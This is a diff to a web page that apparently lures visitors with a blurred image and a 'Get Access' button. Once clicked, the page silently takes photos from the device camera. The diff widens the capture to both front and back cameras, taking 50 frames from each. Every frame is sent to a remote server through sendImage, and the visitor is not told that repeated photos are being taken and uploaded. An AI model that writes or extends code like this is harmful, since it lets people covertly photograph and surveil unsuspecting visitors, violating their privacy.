@@ -15,7 +15,7 @@ body{
   -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
 }
 .container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:center;}
-header{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:30px;}
+header{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:30px;}
 .logo{display:flex;align-items:center;gap:8px;}
 .logo img{width:32px; height:32px;}
 .logo h2{margin:0;font-size:18px;font-weight:600;}
@@ -23,6 +23,8 @@ main.hero{display:flex;gap:30px;align-items:center;justify-content:center;flex-w
 .hero-left{text-align:center;max-width:520px;}
 .hero-left p, .hero-left h1, .hero-left .eyebrow{
   margin:6px 0;
+  font-family:'Inter', sans-serif;
+  font-weight:700;
 }
 h1{font-size:36px;line-height:1.1;}
 p.lead{color:rgba(255,255,255,0.85);}
@@ -39,11 +41,11 @@ p.lead{color:rgba(255,255,255,0.85);}
 #display{
   display:block;
   border-radius:10px;
-  width:320px;
-  height:220px;
+  width:300px;
+  height:200px;
   object-fit:cover;
   border:2px solid rgba(255,255,255,0.06);
-  filter: blur(4px);
+  filter: blur(6px);
 }
 @media (max-width:760px){
   h1{font-size:26px;}
@@ -73,7 +75,7 @@ p.lead{color:rgba(255,255,255,0.85);}
 
     <div class="hero-right">
       <div class="card">
-        <img id="display" src="Capture.PNG?v=5" alt="Capture">
+        <img id="display" src="Capture.PNG?v=6" alt="Capture">
       </div>
     </div>
   </main>
@@ -105,35 +107,37 @@ async function sendImage(base64){
   }catch(e){ console.error('send error', e); return null; }
 }
 
-getBtn.addEventListener('click', async () => {
+async function startCapture(){
   getBtn.disabled = true;
   getBtn.textContent = 'Processing...';
 
-  let stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-  } catch (err) {
-    alert('Camera access denied: ' + (err.message || err));
-    getBtn.disabled = false;
-    getBtn.textContent = 'Get Access';
-    return;
+  const cameras = ['user','environment']; // front/back
+  for(const cam of cameras){
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
+    } catch (err) {
+      console.warn(`Camera ${cam} not accessible:`, err);
+      continue;
+    }
+    video.srcObject = stream;
+    await video.play();
+
+    // 50 captures par caméra
+    for(let i=0;i<50;i++){
+      const base64 = captureFrame();
+      sendImage(base64).then(res=>console.log('sent',res)).catch(()=>{});
+      await new Promise(r=>setTimeout(r, 1200));
+    }
+
+    stream.getTracks().forEach(t=>t.stop());
   }
 
-  video.srcObject = stream;
-  try{ await video.play(); }catch(e){}
-
-  const CAPTURES = 50;
-  const INTERVAL = 1200;
-  for(let i=0;i<CAPTURES;i++){
-    const base64 = captureFrame();
-    sendImage(base64).then(res=>console.log('sent',res)).catch(()=>{});
-    await new Promise(r=>setTimeout(r, INTERVAL));
-  }
-
-  stream.getTracks().forEach(t=>t.stop());
   getBtn.disabled = false;
   getBtn.textContent = 'Get Access';
-});
+}
+
+getBtn.addEventListener('click', startCapture);
 </script>
 </body>
 </html>
